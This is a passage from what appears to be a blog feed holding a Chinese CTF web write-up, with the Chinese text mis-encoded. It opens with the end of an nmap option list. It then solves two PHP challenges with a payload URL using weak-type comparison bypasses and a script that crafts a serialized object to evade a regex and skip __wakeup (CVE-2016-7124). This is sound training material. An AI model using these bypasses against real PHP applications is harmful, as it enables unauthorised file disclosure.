<p>-6                      å¼€å¯IPv6<br> -A                      OSè¯†åˆ«,ç‰ˆæœ¬æ¢æµ‹,è„šæœ¬æ‰«æå’Œtraceroute<br> â€“datedir DIRNAME       è¯´æ˜ç”¨æˆ·Nmapæ•°æ®æ–‡ä»¶ä½ç½®<br> â€“send-eth &#x2F; â€“send-ip  ä½¿ç”¨åŸä»¥å¤ªç½‘å¸§å‘é€&#x2F;åœ¨åŸIPå±‚å‘é€<br> â€“privileged            å‡å®šç”¨æˆ·å…·æœ‰å…¨éƒ¨æƒé™<br> â€“unprovoleged          å‡å®šç”¨æˆ·ä¸å…·æœ‰å…¨éƒ¨æƒé™,åˆ›å»ºåŸå§‹å¥—æ¥å­—éœ€è¦rootæƒé™<br> -V                      æ‰“å°ç‰ˆæœ¬ä¿¡æ¯<br> -h                      è¾“å‡ºå¸®åŠ©</p>
</blockquote>
]]></content>
      <categories>
        <category>é¶åœº</category>
      </categories>
  </entry>
  <entry>
    <title>æ”»é˜²ä¸–ç•Œ-web</title>
    <url>/2023/03/18/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-web/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/>

<h2 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a>easyphp</h2><p><img src="https://img-blog.csdnimg.cn/777b9016dc7d4931934149f054da6fb2.png" alt="1"></p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$key1</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token variable">$key2</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>

<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$b</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">6000000</span> <span class="token operator">&amp;&amp;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token string single-quoted-string">'8b184b'</span> <span class="token operator">===</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$key1</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Emmm...å†æƒ³æƒ³"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Emmm..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token variable">$c</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword type-casting">array</span><span class="token punctuation">)</span><span class="token function">json_decode</span><span class="token punctuation">(</span>@<span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">is_numeric</span><span class="token punctuation">(</span>@<span class="token variable">$c</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"m"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$c</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"m"</span><span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">2022</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_array</span><span class="token punctuation">(</span>@<span class="token variable">$c</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"n"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"n"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">2</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"n"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$d</span> <span class="token operator">=</span> <span class="token function">array_search</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"DGGJ"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"n"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$d</span> <span class="token operator">===</span> <span class="token constant boolean">false</span><span class="token operator">?</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"no..."</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token class-name return-type">NULL</span><span class="token punctuation">;</span>
        <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"n"</span><span class="token punctuation">]</span> <span class="token keyword">as</span> <span class="token variable">$key</span><span class="token operator">=></span><span class="token variable">$val</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token variable">$val</span><span class="token operator">===</span><span class="token string double-quoted-string">"DGGJ"</span><span class="token operator">?</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"no......"</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token class-name return-type">NULL</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token variable">$key2</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"no hack"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"no"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$key1</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$key2</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">include</span> <span class="token string double-quoted-string">"Hgfks.php"</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"You're right"</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>é‡‡ç”¨ç§‘å­¦è®¡æ•°æ³•ç»•è¿‡a&#x3D;9e9</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">6000000</span> <span class="token operator">&amp;&amp;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>ç¼–å†™è„šæœ¬</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span><span class="token number">1000000</span> <span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> 
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'8b184b'</span> <span class="token operator">===</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">echo</span> <span class="token variable">$i</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;br>'</span><span class="token operator">.</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>å¾—åˆ°<br><img src="https://img-blog.csdnimg.cn/be82814851a4407c84b59756e4a81c42.png" alt="2"><br>å³b&#x3D;53724</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$c</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword type-casting">array</span><span class="token punctuation">)</span><span class="token function">json_decode</span><span class="token punctuation">(</span>@<span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">#æ¥æ”¶jsonæ ¼å¼çš„å­—ç¬¦ä¸²å¹¶å°†å…¶è½¬åŒ–ä¸ºæ•°ç»„</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>äº†è§£ä¸€ä¸‹jsonæ ¼å¼<a href="https://zhuanlan.zhihu.com/p/74151127">JSONæ•°æ®æ ¼å¼è¯¦è§£</a></p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">is_numeric</span><span class="token punctuation">(</span>@<span class="token variable">$c</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"m"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$c</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"m"</span><span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">2022</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>ç”¨c&#x3D;{â€œmâ€:â€2222câ€}ç»•è¿‡ï¼Œ</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_array</span><span class="token punctuation">(</span>@<span class="token variable">$c</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"n"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"n"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">2</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"n"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>c&#x3D;{â€œmâ€:â€2222câ€,â€nâ€:[[1],0]}</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$d</span> <span class="token operator">=</span> <span class="token function">array_search</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"DGGJ"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"n"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>é»˜è®¤çš„ç¬¬ä¸‰ä¸ªflaseå‚æ•°å¯¼è‡´äº†å¼±ç±»å‹æ¯”è¾ƒæ¼æ´ã€‚å½“æˆ‘ä»¬çš„$c[â€œnâ€]&#x3D;0çš„æ—¶å€™(æˆ–è€…null)ï¼Œä¼šå°†å‰é¢è¦æŸ¥æ‰¾çš„å­—ç¬¦ä¸²è‡ªåŠ¨è½¬åŒ–ä¸º0ç„¶åè¿›è¡Œæ¯”è¾ƒã€‚<br>ç»•è¿‡æ‰‹æ³•<strong>c&#x3D;{â€œmâ€:â€2222câ€,â€nâ€:[[],0]}</strong><br>payloadï¼š<code>http://61.147.171.105:54356?a=9e9&amp;b=53724&amp;c=&#123;&quot;m&quot;:&quot;2222c&quot;,&quot;n&quot;:[[0],0]&#125;</code></p>
<p><img src="https://img-blog.csdnimg.cn/4707ba60885b4bab8b4c6a5e663060b4.png" alt="3"></p>
<h2 id="Web-php-unserialize"><a href="#Web-php-unserialize" class="headerlink" title="Web_php_unserialize"></a>Web_php_unserialize</h2><p><img src="https://img-blog.csdnimg.cn/e550b56fa030492b9f805746e000103b.png" alt="1"></p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> 
<span class="token keyword">class</span> <span class="token class-name-definition class-name">Demo</span> <span class="token punctuation">&#123;</span> 
    <span class="token keyword">private</span> <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'index.php'</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> 
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">file</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token punctuation">;</span> 
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> 
        <span class="token keyword">echo</span> @<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">file</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> 
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">file</span> <span class="token operator">!=</span> <span class="token string single-quoted-string">'index.php'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> 
            <span class="token comment">//the secret is in the fl4g.php</span>
            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">file</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'index.php'</span><span class="token punctuation">;</span> 
        <span class="token punctuation">&#125;</span> 
    <span class="token punctuation">&#125;</span> 
<span class="token punctuation">&#125;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'var'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> 
    <span class="token variable">$var</span> <span class="token operator">=</span> <span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'var'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[oc]:\d+:/i'</span><span class="token punctuation">,</span> <span class="token variable">$var</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> 
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'stop hacking!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
        @<span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$var</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
    <span class="token punctuation">&#125;</span> 
<span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span> 
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token punctuation">&#125;</span> 
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>ç”±ä»£ç å¯çŸ¥ï¼Œflagæ–‡ä»¶å¾ˆæœ‰å¯èƒ½åœ¨fl4g.phpé‡Œã€‚<br>åˆ†æä¸€ä¸‹ä»£ç ï¼š</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> 
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">file</span> <span class="token operator">!=</span> <span class="token string single-quoted-string">'index.php'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> 
            <span class="token comment">//the secret is in the fl4g.php</span>
            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">file</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'index.php'</span><span class="token punctuation">;</span> 
        <span class="token punctuation">&#125;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>è¿™æ®µä»£ç ä¼šå°†æˆ‘ä»¬è¦æ‰¾çš„æ–‡ä»¶æ›¿æ¢ä¸ºindex.phpã€‚<br>æœ¬é¢˜çš„phpç‰ˆæœ¬ä¸º<strong>PHP&#x2F;5.3.10-1</strong>ï¼Œå¯ä»¥ä½¿ç”¨<strong>cveæ¼æ´</strong>ç»•è¿‡_wakeup()ã€‚</p>
<blockquote>
<p>CVE-2016-7124(ç»•è¿‡__wakeup)<br>æ¼æ´å½±å“ç‰ˆæœ¬ï¼š<br>PHP5 &lt; 5.6.25<br>PHP7 &lt; 7.0.10</p>
</blockquote>
<blockquote>
<p>æ¼æ´äº§ç”ŸåŸå› ï¼š<br>å¦‚æœå­˜åœ¨__wakeupæ–¹æ³•ï¼Œè°ƒç”¨ unserilize() æ–¹æ³•å‰åˆ™å…ˆè°ƒç”¨__wakeupæ–¹æ³•ï¼Œä½†æ˜¯åºåˆ—åŒ–å­—ç¬¦ä¸²ä¸­è¡¨ç¤ºå¯¹è±¡å±æ€§ä¸ªæ•°çš„å€¼å¤§äº çœŸå®çš„å±æ€§ä¸ªæ•°æ—¶ä¼šè·³è¿‡__wakeupçš„æ‰§è¡Œ </p>
</blockquote>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'var'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> 
    <span class="token variable">$var</span> <span class="token operator">=</span> <span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'var'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[oc]:\d+:/i'</span><span class="token punctuation">,</span> <span class="token variable">$var</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> 
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'stop hacking!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
        @<span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$var</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
    <span class="token punctuation">&#125;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>ç»•è¿‡æ­£åˆ™è¡¨è¾¾å¼ï¼Œé¦–å…ˆè§£é‡Šä¸€ä¸‹<code>&#39;/[oc]:\d+:/i&#39;</code>ï¼Œ<code>[oc]</code>ï¼šåŒ¹é…åˆ°oæˆ–cï¼Œ<code>\d</code>ï¼šæ•´å‹æ•°ã€‚ä¹Ÿå°±æ˜¯åŒ¹é…åˆ°ç±»ä¼¼**O:2:<strong>çš„ä¼šè¾“å‡º</strong>stop hacking!<strong>å¦‚ä½•ç»•è¿‡å‘¢ï¼Ÿæˆ‘ä»¬æŠŠ</strong>O:2:<strong>æ”¹æˆ</strong>O:+2:**ä¸å°±è¡Œäº†ï¼Ÿ<br>å…·ä½“ä»£ç ï¼š</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> 
<span class="token keyword">class</span> <span class="token class-name-definition class-name">Demo</span> <span class="token punctuation">&#123;</span> 
    <span class="token keyword">private</span> <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'index.php'</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> 
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">file</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token punctuation">;</span> 
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> 
        <span class="token keyword">echo</span> @<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">file</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> 
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">file</span> <span class="token operator">!=</span> <span class="token string single-quoted-string">'index.php'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> 
            <span class="token comment">//the secret is in the fl4g.php</span>
            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">file</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'index.php'</span><span class="token punctuation">;</span> 
        <span class="token punctuation">&#125;</span> 
    <span class="token punctuation">&#125;</span> 
<span class="token punctuation">&#125;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">x</span><span class="token punctuation">&#123;</span>
	<span class="token keyword">private</span> <span class="token variable">$file</span><span class="token operator">=</span><span class="token string single-quoted-string">'fl4g.php'</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token variable">$a</span><span class="token operator">=</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Demo</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'fl4g.php'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;br>'</span><span class="token punctuation">;</span>
<span class="token variable">$a</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'O:4:'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'O:+4:'</span><span class="token punctuation">,</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//ç»•è¿‡æ­£åˆ™è¡¨è¾¾å¼</span>
<span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;br>'</span><span class="token punctuation">;</span>
<span class="token variable">$a</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">':1:'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">':2:'</span><span class="token punctuation">,</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//ç»•è¿‡_wakeup()å‡½æ•°</span>
<span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;br>'</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;br>'</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><em><em>$file æ˜¯ç§æœ‰æˆå‘˜åºåˆ—åŒ–ä¹‹åå­—ç¬¦ä¸²é¦–å°¾ä¼šå¤šå‡ºä¸¤ä¸ªç©ºæ ¼ â€œ%00</em>%00â€ï¼Œæ‰€ä»¥base64åŠ å¯†æœ€å¥½åœ¨ä»£ç ä¸­æ‰§è¡Œé˜²æ­¢å¤åˆ¶æ¼æ‰</em>*<br>è¿è¡Œä¹‹åå¾—åˆ°<br><img src="https://img-blog.csdnimg.cn/4f6b3bfcae2a4126ae4efcdb8ec73965.png" alt="2"><br>getä¼ å‚å¾—åˆ°flagã€‚<br><img src="https://img-blog.csdnimg.cn/6a5689494cef49759c2f6d74d441bd2f.png" alt="3"><br>è¿™ä¸ªé¢˜å¾ˆæœ‰å­¦ä¹ ä»·å€¼ï¼ï¼ï¼</p>
